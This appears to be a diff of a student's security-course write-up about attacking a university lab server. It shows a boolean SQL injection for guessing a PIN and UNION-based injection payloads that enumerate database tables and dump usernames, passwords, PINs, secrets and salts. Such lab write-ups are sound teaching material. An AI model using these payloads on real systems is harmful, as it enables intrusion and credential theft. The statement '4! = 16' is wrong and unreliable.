@@ -37,7 +37,7 @@ is 0,..,9).
 ')) OR 1 = 1 AND username = 'endlemar' AND pin LIKE '%<number>%' -- 
 ```
 
-That meant that there is only `4! = 16` possible PINs. However, I constructed another queries to find out the digits
+That meant that there is only `4! = 16` possible PINs. However, I constructed additional queries to find out the digits'
 relative precedence to each other (the condition evaluated to TRUE when `<i>` preceded `<j>`).
 
 ```
@@ -94,4 +94,34 @@ And to my pleasant surprise, the server responded with a highlighted source code
 After a quick look, I figured it must be the same index.php that is actually running on the server.
 
 **Note 3:** In fact, no login is needed to access https://kbe.felk.cvut.cz/index.php?open=index.php.
-**Note 4:** The code confirms my suspicions from [Task 3's Side note](#side-note).
+**Note 4:** The code (line 67) confirms my suspicions from [Task 3's Side note](#side-note).
+
+The next feature I noticed was the pagination mechanism of messages which was using `offset` query parameter.
+By looking into the code I quickly constructed offset values that helped me obtain the names of the database tables and
+their column names:
+
+```
+0 UNION SELECT table_name, 1 FROM information_schema.tables
+0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'users'
+0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'messages'
+0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'codes'
+
+0 UNION SELECT CONCAT(username, '\t', password, '\t', pin, '\t', secret, '\t', salt), 1 FROM users
+0 UNION SELECT CONCAT(username, '\t', base64_message_xor_key, '\t', date_time), 1 FROM messages
+```
+
+The database has 3 tables with the following columns:
+
+* users
+	* username
+	* password
+	* pin
+	* secret
+	* salt
+* messages
+	* username
+	* base64_message_xor_key
+	* date_time
+* codes
+	* username
+	* aes_encrypt_code
